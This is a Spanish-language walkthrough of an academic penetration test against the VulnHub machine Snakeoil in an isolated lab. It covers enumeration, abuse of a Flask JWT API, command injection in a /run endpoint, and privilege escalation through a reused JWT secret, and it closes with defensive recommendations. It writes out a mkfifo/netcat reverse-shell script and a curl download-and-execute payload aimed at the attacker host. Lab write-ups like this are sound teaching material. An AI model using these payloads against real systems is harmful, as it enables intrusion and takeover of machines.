De la teoría a la práctica
Walkthrough en acción

Walkthrough completo de pentesting académico contra la máquina vulnerable Snakeoil (DigitalWorld.local: SNAKE OIL), publicada en VulnHub, ejecutado en un entorno de virtualización local y aislado. El proyecto demuestra la aplicación práctica de la metodología clásica de pentesting: reconocimiento, enumeración, análisis de vulnerabilidades, explotación, post-explotación y escalada de privilegios, documentando cada paso con comandos, resultados y capturas de pantalla, además de un video explicativo de todo el proceso.

arp-scan nmap gobuster curl / API REST Flask + JWT RCE / SSRF netcat Escalada a root

Objetivos específicos

  • Configurar un entorno de virtualización aislado para pruebas seguras.
  • Escanear y enumerar servicios para identificar vectores de ataque.
  • Investigar y evaluar el riesgo de las vulnerabilidades encontradas.
  • Seleccionar y adaptar exploits para comprometer el sistema.
  • Escalar privilegios hasta obtener acceso administrativo (root).
  • Documentar cada paso y grabar un video explicando el proceso completo.

Infraestructura del laboratorio

  • Atacante: Kali Linux — 192.168.253.129
  • Objetivo: Snakeoil (VulnHub) — 192.168.253.130
  • Entorno: Laboratorio local en VMware, sin acceso a internet
  • Fuente de la VM: vulnhub.com — DigitalWorld.local: SNAKE OIL

Metodología

Fases del ejercicio

01
Descubrimiento de host — reconocimiento de red para ubicar la IP del objetivo.
02
Escaneo de puertos y servicios — identificación de servicios expuestos y su versión.
03
Enumeración de directorios web — descubrimiento de rutas y endpoints ocultos de la API.
04
Abuso de la API — registro, login y autenticación mediante tokens JWT.
05

07

08
Escalada de privilegios a root — abuso de reutilización de credenciales.

Procedimiento · 1

Reconocimiento y enumeración

1. Descubrimiento de host — arp-scan

Barrido ARP en la red local para localizar la IP del objetivo entre los hosts activos del segmento.

root@kali:~# arp-scan -I eth0 -l
192.168.253.130 00:0c:29:c6:16:ed (Unknown)

2. Escaneo de puertos y servicios — nmap

Escaneo completo de los 65535 puertos TCP con detección de versión y sistema operativo. Se identifican SSH (22), HTTP nginx (80) y una segunda aplicación HTTP en el puerto 8080 — el servicio más interesante para continuar.

root@kali:~# nmap -sC -sV -O -p- -T4 192.168.253.130
22/tcp open ssh OpenSSH 7.9p1 Debian
80/tcp open http nginx 1.14.2 — "Welcome to SNAKEOIL!"
8080/tcp open http nginx 1.14.2 — "Welcome to Good Tech Inc.'s Snake Oil Project"

3. Enumeración de directorios — gobuster

Fuerza bruta de rutas sobre la aplicación del puerto 8080. Se descubren /login, /registration, /users, /create y un endpoint sospechoso: /secret, revelando una API construida en Flask.

root@kali:~# gobuster dir -u http://192.168.253.130:8080 -w directory-list-2.3-medium.txt
login (Status: 405)
registration (Status: 200)
users (Status: 200)
create (Status: 200)
secret (Status: 200)

Procedimiento · 2

Abuso de la API

1. Registro de usuario

root@kali:~# curl -X POST http://.../registration -d '{"username":"csnv","password":"test1234"}'
{"message":"User csnv was created...", "access_token":"eyJ0eXAi..."}

2. Login y obtención de tokens

El servidor responde con access_token y refresh_token, ambos JWT, confirmando autenticación basada en tokens (Flask-JWT-Extended).

root@kali:~# curl -X POST http://.../login -d '{"username":"csnv","password":"test1234"}' -v
HTTP/1.1 200 OK — "Logged in as csnv"

3. Acceso al endpoint /secret

Usando el token como cookie se accede a /secret, que revela un dato crítico: el nombre de la clave ya sugiere la existencia de un endpoint de ejecución de comandos.

root@kali:~# curl -s http://.../secret -H "Cookie: access_token_cookie=<JWT>"
{"ip-address":"", "secret_key":"commandexecutionissecret"}

Procedimiento · 3

Explotación: RCE en /run y shell reversa

1. Inyección de comandos

El endpoint /run toma el valor de url y lo pasa como argumento a un curl interno en el servidor, confirmando inyección de comandos / SSRF a través de backticks.

root@kali:~# curl -X POST http://.../run -d '{"url":"`mkdir -p /home/patrick/.ssh`","secret_key":"commandexecutionissecret"}'

2. Preparación de la shell reversa

Script clásico basado en mkfifo y nc, apuntando de vuelta a la IP del atacante en el puerto 4444.

root@kali:~# cat > ~/shell2.sh << 'EOF'
#!/bin/sh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.253.129 4444 > /tmp/f
EOF

3. Entrega del payload y listener

Se sirve el script vía un servidor HTTP local y se deja un listener de netcat en espera de la conexión.

root@kali:~# python3 -m http.server 80
root@kali:~# nc -lvnp 4444

4. Ejecución del RCE

Se aprovecha /run para que la víctima descargue y ejecute el script, cerrando la cadena de explotación.

root@kali:~# curl -X POST http://.../run -d '{"url":"curl http://192.168.253.129/shell2.sh -o /tmp/s2.sh",...}'
root@kali:~# curl -X POST http://.../run -d '{"url":"`sh /tmp/s2.sh`",...}'

5. Shell obtenida

listening on [any] 4444 ...
connect to [192.168.253.129] from (UNKNOWN) [192.168.253.130] 43302
 $ whoami
patrick
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

Procedimiento · 4

Post-explotación y escalada a root

1. Revisión del código fuente

Dentro de ~/flask_blog se encuentra el código completo de la aplicación. En app.py aparece, en texto plano, la clave JWT_SECRET_KEY usada para firmar los tokens, junto con una nota de desarrollo indicando que la protección CSRF de las cookies JWT está desactivada.

patrick@SNAKEOIL:~/flask_blog$ cat app.py
app.config['JWT_SECRET_KEY'] = 'NOreasonableDOUBTthisPASSWORDisGOOD'
app.config['JWT_COOKIE_CSRF_PROTECT'] = False # development setting!

2. Escalada de privilegios a root

La misma cadena usada para firmar los JWT resultó ser también la contraseña real de patrick en el sistema — un caso clásico de reutilización de credenciales.

patrick@SNAKEOIL:~/flask_blog$ sudo su
[sudo] password for patrick: NOreasonableDOUBTthisPASSWORDisGOOD
root@SNAKEOIL:~# whoami
root

Como verificación fuera de banda, se confirmó el acceso comparando con la terminal local de la interfaz gráfica de Snakeoil bajo el usuario patrick.

Hallazgos

Vulnerabilidades identificadas

VulnerabilidadUbicaciónImpacto
Exposición del endpoint /secret con clave de "modo de ejecución de comandos" a cualquier usuario autenticado API Flask (puerto 8080) Alto
Inyección de comandos (RCE) en el endpoint /run a través del parámetro url API Flask (puerto 8080) Crítico
Descarga y ejecución arbitraria de archivos remotos Endpoint /run Crítico
Clave JWT en texto plano dentro del código fuente, reutilizada como contraseña de sistema app.py Crítico
JWT_COOKIE_CSRF_PROTECT = False (configuración de desarrollo expuesta) app.py Medio
Uso de sudo su con contraseña débil/reutilizada, sin restricción de comandos Sistema operativo Alto

Controles defensivos

Recomendaciones

Manejo de secretos

  • Nunca incluir claves secretas o contraseñas en el código fuente; usar variables de entorno o gestores de secretos.
  • Nunca reutilizar la clave de firma de JWT como contraseña de ningún usuario del sistema.

Superficie de ataque

  • Restringir por completo cualquier endpoint que ejecute comandos o peticiones externas controladas por el usuario.
  • Eliminar o proteger fuertemente endpoints de depuración/administrativos como /secret y /run antes de producción.

Configuración y privilegios

  • Habilitar protección CSRF en cookies JWT y revisar toda configuración marcada como "development setting".
  • Aplicar el principio de mínimo privilegio en cuentas de sudo.

Conclusión

Reflexiones finales

El ejercicio demuestra una cadena de explotación completa: desde el descubrimiento del host, pasando por el hallazgo de una API mal asegurada con un endpoint de ejecución de comandos, hasta la obtención de una shell reversa y la escalada de privilegios a root gracias a una mala práctica de manejo de secretos (clave JWT reutilizada como contraseña).

Es un caso de estudio útil sobre cómo pequeños errores de configuración y diseño de APIs pueden derivar en el compromiso total de un sistema, y sobre la importancia de separar claramente los secretos criptográficos de las credenciales de acceso al sistema operativo.
